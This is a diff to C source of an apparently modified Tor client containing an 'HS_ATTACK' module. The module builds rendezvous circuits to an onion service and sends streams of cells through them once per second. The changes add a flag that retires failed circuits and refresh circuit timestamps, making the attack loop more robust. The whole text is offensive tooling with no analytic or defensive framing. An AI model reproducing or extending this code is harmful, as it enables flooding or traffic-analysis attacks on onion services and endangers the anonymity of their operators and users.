@@ -37,6 +37,7 @@ static int launch_new_rendezvous(){
   circmap->introcirc = NULL;
   circmap->state_intro = CIRC_NO_STATE;
   circmap->state_rend = REND_CIRC_BUILDING;
+  circmap->do_not_touch = 0;
   log_info(LD_REND, "HS_ATTACK: launching rend circuit");
   circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
       CIRCLAUNCH_IS_INTERNAL);
@@ -272,6 +273,7 @@ void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
     if (circmap->rendcirc == rendcirc) {
       log_info(LD_REND,"HS_ATTACK: Marking rendezvous circuit ready");
       circmap->state_rend = REND_CIRC_READY_FOR_RD;
+      circmap->rendcirc->base_.timestamp_dirty = time(NULL);
     }
     if (circmap->state_rend == REND_CIRC_READY_FOR_RD)
       count_ready++;
@@ -361,7 +363,6 @@ static void hs_attack_launch(void *until_launch) {
     /*Just send 1 rd through each rendezvous circ*/
     time_t now = time(NULL);
     struct timeval tv, tv_then;
-    int i = 0;
     int circmaps_sl_idx, circmaps_sl_len;
     circ_info_t *circmap;
     while (*until > now) {
@@ -376,9 +377,10 @@ static void hs_attack_launch(void *until_launch) {
         }
         //log_info(LD_REND, "HS_ATTACK: Trying to send rd cell down circ %s\n",
         //    circuit_list_path(circmap->rendcirc, 0));
-        if (!TO_CIRCUIT(circmap->rendcirc)->marked_for_close) {
+        if (!circmap->do_not_touch) {
           for (int j = 0; j <  cell_per_circuit; j++) {
             if (send_rd_cell(circmap->rendcirc) < 0) {
+              circmap->do_not_touch = 1;
               break;
             }
             attack_infos->stats->tot_cells++;
@@ -390,7 +392,6 @@ static void hs_attack_launch(void *until_launch) {
       if ( 1000000 * tv_then.tv_sec + tv_then.tv_usec - 1000000*tv.tv_sec - tv.tv_usec  < 1000000) {
         usleep(1000000-(1000000*tv_then.tv_sec + tv_then.tv_usec - 1000000*tv.tv_sec - tv.tv_usec));
       }
-      i++;
       /*if (tot_cell_count % 10 == 0)*/
         /*log_info(LD_REND, "HS_ATTACK: launched %u cells", tot_cell_count);*/
       /*if (tot_cell_count % 1000 == 0)*/
@@ -514,7 +515,7 @@ static void hs_attack_check_healthiness() {
           circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
           //if (circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN &&
           /*log_info(LD_REND, "HS_ATTACK: checking state: %s\n", circuit_state_to_string(circmap->rendcirc->base_.state));*/
-          if(circmap->state_rend == REND_CIRC_READY_FOR_RD && TO_CIRCUIT(circmap->rendcirc)->marked_for_close) {
+          if(circmap->state_rend == REND_CIRC_READY_FOR_RD && circmap->do_not_touch) {
             //log_info(LD_REND, "HS_ATTACK: circuit not open anymore was: %s\n", circuit_list_path(circmap->rendcirc, 0));
             /*TO_CIRCUIT(circmap->rendcirc)->marked_for_close = 1;*/
             //TO_CIRCUIT(circmap->introcirc)->marked_for_close = 1;
